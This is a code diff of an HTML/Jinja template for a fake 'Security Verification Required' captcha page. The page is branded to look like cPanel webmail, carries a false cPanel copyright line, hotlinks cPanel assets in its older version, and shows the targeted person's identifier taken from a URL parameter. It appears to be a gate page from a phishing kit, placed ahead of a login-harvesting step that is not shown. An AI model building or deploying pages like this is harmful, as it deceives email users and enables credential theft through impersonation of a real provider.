@@ -1,128 +1,250 @@
-<html dir="ltr"><head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
-
-<!-- EXTERNAL CSS -->
-<link href="https://webmail.cpanel.net/cPanel_magic_revision_1648610195/unprotected/cpanel/fonts/open_sans/open_sans.min.css" rel="stylesheet" type="text/css">
-<link href="https://webmail.cpanel.net/cPanel_magic_revision_1678975705/unprotected/cpanel/style_v2_optimized.css" rel="stylesheet" type="text/css">
-<style type="text/css">
-/* This css is included in the base template in case the css cannot be loaded because of access restrictions
-    If this css is updated, please update main.tmpl as well */
-.copyright {
-background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll center top transparent;
-background-size: 25px auto;
-}
-   h1 {
-      font-size: 36px;
-      margin-bottom: 20px;
-    }
-
-    p {
-      font-size: 18px;
-      margin-bottom: 40px;
-    }
- #captcha-message {
-      color: #E74C3C;
-      text-align: center;
-      margin-top: 10px;
-      display: none;
-    }
-
-    @keyframes fadeIn {
-      from {
-        opacity: 0;
-      }
-      to {
-        opacity: 1;
-      }
-    }
-</style>
-
-<title>Login Secure Challenge</title>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification Required</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom, #ffffff, #f9f7f2);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: 15px;
+        }
+        
+        .card {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .header {
+            background-color: #FF6C2C;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            margin: 0;
+            font-size: 18px;
+        }
+        
+        .content {
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .info-box {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .info-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .info-icon {
+            width: 40px;
+            height: 40px;
+            background: #FF6C2C;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        .info-text {
+            flex: 1;
+        }
+        
+        .info-text .title {
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        
+        .info-text .email {
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .captcha-container {
+            margin: 25px 0;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            display: inline-block;
+        }
+        
+        .captcha-code {
+            font-size: 32px;
+            font-weight: bold;
+            letter-spacing: 5px;
+            color: #333;
+            padding: 15px 25px;
+            background: white;
+            border-radius: 6px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+        
+        .form-control:focus {
+            border-color: #FF6C2C;
+            outline: none;
+        }
+        
+        .btn {
+            display: inline-block;
+            background: #FF6C2C;
+            color: white;
+            padding: 10px 25px;
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background-color 0.3s;
+        }
+        
+        .btn:hover {
+            background: #e55a1f;
+        }
+        
+        .footer {
+            background: #f0f0f0;
+            padding: 20px;
+            text-align: center;
+            font-size: 13px;
+            color: #666;
+        }
+        
+        .message {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 6px;
+            display: none;
+        }
+        
+        .error {
+            background: #ffe6e6;
+            color: #d63031;
+            border: 1px solid #ffcccc;
+        }
+        
+        .instructions {
+            text-align: left;
+            margin-bottom: 25px;
+            color: #555;
+            line-height: 1.5;
+        }
+    </style>
 </head>
-
-<body class="yui-skin-sam security_policy cp small-size">
-<div class="login-page">
-    <div class="login-content">
-        <div class="login-center-answer">
-            <div id="login-wrapper">
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <h1>Security Verification Required</h1>
+            </div>
             
-            
-            <div id="content-container">
-                <div id="security-container">
-                    <div id="security-sub-container">
-                        <div id="login-sub-header">
-                            <img src="https://webmail.cpanel.net/cPanel_magic_revision_1542052117/unprotected/cpanel/images/webmail-logo.svg" alt="logo" class="main-logo">
+            <div class="content">
+                <div class="info-box">
+                    <div class="info-header">
+                        <div class="info-icon">!</div>
+                        <div class="info-text">
+                            <div class="title">Action Required</div>
+                            <div class="email">For: {{ request.args.get('web', 'default') }}</div>
                         </div>
-						
-						
-                        <div id="security-sub">
-                            <div class="login-rt">
-                                <div class="form">
-								
-											 <div class="controls external-auth-items">
-        
-          
-          <div class="external-auth-btn">
-              <a class="external-auth-link" href="/openid_connect/cpanelid?goto_app=&amp;goto_uri=%2f&amp;parameterized_form=&amp;theme=&amp;user=" title="Log in via cPanelID" style="background-color:#FF6C2C;color:#FFFFFF" referrerpolicy="origin">
-                  
-                    <span class="external-auth-btn-label"><h1 class="label--title"> <div id="captcha-container">{{ code }}</div></h1> </span>
-                  
-              </a>
-          </div>
-        
-    </div>
-			
-								
-<h1 class="label--title">
-Solve the following tasks to prove that you are human
-</h1>
-<form novalidate="" name="tfa_login_form" id="captcha-form" method="POST" action="{{ url_for('captcha') }}">
-    <div class="input-field-login icon token-container">
-        <input name="code" id="captcha-input" class="std_textbox" type="text" placeholder="Enter the security code" autofocus="autofocus" autocomplete="off" required>
-		<input type="hidden" name="web" value="{{ request.args.get('web') }}">
-		<br>
-    </div>
-    <div class="controls">
-        <div class="login-btn">
-            <button type="submit" id="captcha-submit" class="input-button">Continue</button>
+                    </div>
+                </div>
+                
+                
+                
+                <p>Enter the code displayed below to verify you are human:</p>
+                
+                <div class="captcha-container">
+                    <div class="captcha-code" id="captcha-code">{{ code }}</div>
+                </div>
+                
+                <form id="captcha-form" method="POST" action="{{ url_for('captcha') }}">
+                    <div class="form-group">
+                        <label for="captcha-input">Security Code</label>
+                        <input type="text" id="captcha-input" class="form-control" name="code" placeholder="Enter the code above" required>
+                    </div>
+                    
+                    <input type="hidden" name="web" value="{{ request.args.get('web') }}">
+                    
+                    <button type="submit" class="btn">Verify & Continue</button>
+                </form>
+                
+                <div id="captcha-message" class="message error"></div>
+            </div>
+            
+            <div class="footer">
+                <p>&copy; 2025 cPanel. All Rights Reserved.</p>
+            </div>
         </div>
     </div>
-</form>
-  <p id="captcha-message"></p>
-</div>
-</div>
-<div class="clear"></div>
-</div>
-</div>
-<!-- close login-wrapper -->
-</div>
-</div>
-</div>
-</div>
-</div>
-<div class="copyright">Copyright©&nbsp;2024 cPanel, L.L.C.
-<br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>
-</div>
-
-<script>
-    // Check if user input matches the code
-    var captchaForm = document.getElementById('captcha-form');
-    var errorMessage = document.getElementById('captcha-message');
-
-    captchaForm.addEventListener('submit', function(event) {
-      event.preventDefault();
-      var captchaInput = document.getElementById('captcha-input');
-
-      if (captchaInput.value == "{{ code }}") {
-        // Submit form
-        captchaForm.submit();
-      } else {
-        errorMessage.innerText = 'Sorry, the code you entered is incorrect. Please try again.';
-        errorMessage.style.display = 'block'; // Show error message
-        captchaInput.value = '';
-      }
-    });
-  </script>
-
-</body></html>
+    
+    <script>
+        document.getElementById('captcha-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var captchaInput = document.getElementById('captcha-input');
+            var errorMessage = document.getElementById('captcha-message');
+            
+            if (captchaInput.value === "{{ code }}") {
+                // Form is valid, submit it
+                this.submit();
+            } else {
+                // Show error message
+                errorMessage.textContent = 'Sorry, the code you entered is incorrect. Please try again.';
+                errorMessage.style.display = 'block';
+                captchaInput.value = '';
+                captchaInput.focus();
+            }
+        });
+    </script>
+</body>
+</html>
